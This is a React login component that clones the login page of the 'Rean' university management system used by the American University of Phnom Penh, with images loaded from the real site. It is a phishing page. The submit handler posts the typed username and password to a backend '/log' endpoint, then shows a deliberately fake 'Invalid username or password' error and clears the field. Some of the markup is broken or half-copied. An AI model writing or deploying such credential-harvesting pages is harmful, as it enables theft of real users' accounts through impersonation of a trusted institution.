import React, { useState } from "react";
// import "./login.css";

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });
      // show fake error message and clear password
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  // return (
  //   <div style={{ maxWidth: 360, margin: "6rem auto", padding: 20, border: "1px solid #ddd", borderRadius: 6 }}>
  //     <h2>Sign in</h2>
  //     <form onSubmit={handleSubmit}>
  //       <div style={{ marginBottom: 8 }}>
  //         <input value={username} onChange={e => setUsername(e.target.value)} placeholder="Username" required style={{ width: "100%", padding: 8 }} />
  //       </div>
  //       <div style={{ marginBottom: 8 }}>
  //         <input value={password} onChange={e => setPassword(e.target.value)} type="password" placeholder="Password" required style={{ width: "100%", padding: 8 }} />
  //       </div>
  //       <button type="submit" style={{ width: "100%", padding: 10 }}>Sign in</button>
  //     </form>
  //     {msg && <p style={{ color: "firebrick", marginTop: 12 }}>{msg}</p>}
  //   </div>
  // );

  return (
    <div className="login-container_camu" id="camuLoginContainer">
      <div className="row login-full-container m-0">
        <div className="col-lg-6 left-grid">
          <div className="left-back-img">
            <img src="data:image/svg+xml;base64," alt></img>
          </div>
          <div className="login-details-left">
            <div className="login-banner-view">
              <div className="left-banner-section mb-5">
                <div id="login-box" className="no_margin login-banner-box mainblock visible m-0" style={{ backgroundImage: "url('https://test.rean.gov.kh/v2/8e1bc2a1925d0cfa8a4fad5a8ecdd278.jpg')" }}></div>
              </div>
              <p className="fs-6 text-white font-bold flex justify-content-center">University Management System</p>
              <p className="text-white flex justify-content-center text-center">
                "Prioritize user experience by creating and intuitive interface that is easy to navigate, ensuring quick and hassie-free access to the system"
              </p>
            </div>
            <div className="user-account_cont">
              <p className="more-login_label">
                <span className="fs-4">Prepared by</span>
              </p>
            </div>
            <div className="row justify-center">
              <div className="col-md-5 col-lg-5 flex align-items-center">
                
              </div>
              <div className="col-md-2 col-lg-2 divided">
                <span></span>
                ::after
              </div>
              <div className="col-md-5 col-lg-5 white-img">

              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="col-lg-6 right-grid">
        <div className="product-details">
          <div className="product-logo"></div>
          <div>
            <span className="mr-3 UMS-hide">New to Rean?</span>
            <button type="button" className="fs-3 btn-user_create btn btn-secondary">Create an account</button>
          </div>
        </div>
        <div className="logn-details-right">
          <div>
            <div className="institution-details_cont">
              <img src="https://test.rean.gov.kh/camu_attachment/get/664eb23422793a769a22e7b2" alt="inst-img" />
              <span>
                <p className="institution-name_label">American University of Phnom Penh</p>
                <p className="institution-back_view">
                  <span>Not from</span>
                  <span>
                    "American University of Phnom Penh"
                    "?"
                  </span>
                </p>
              </span>
            </div>
            <p className="account-create_label">Login to Rean</p>
            <div>
              <form noValidate class>
                  <div className="details-input_box">
                    <div>
                      <label className="fs-3 mb-1 text-primary transform-text false form-label">User name</label>
                      <input name="Email" title label type="text" className="fs-3 mb-2 form-control" value></input>
                      <div className="invalid-feedback">User name is required</div>
                    </div>

                    <div className="password-user_cont">
                      <div>
                        <label className="fs-3 mb-1 text-primary transform-text false form-label">Password</label>
                        <input name="pwd" title label type="password" className="fs-3 password-form_cont form-control" value></input>
                        <div className="invalid-feedback">Password is required</div>
                      </div>

                      <div className="password-view">
                        <span className="material-symbols-rounded toggle-password" id="password_hide">visible</span>
                      </div>
                    </div>
                  </div>
                  <div className="keep-sign mt-3">
                    <p className="forget-password">
                      <span>Forgot password?</span>
                    </p>
                  </div>

                  <div className="login-btn_group">
                    <button type="submit" className="login-btn">Login</button>
                  </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
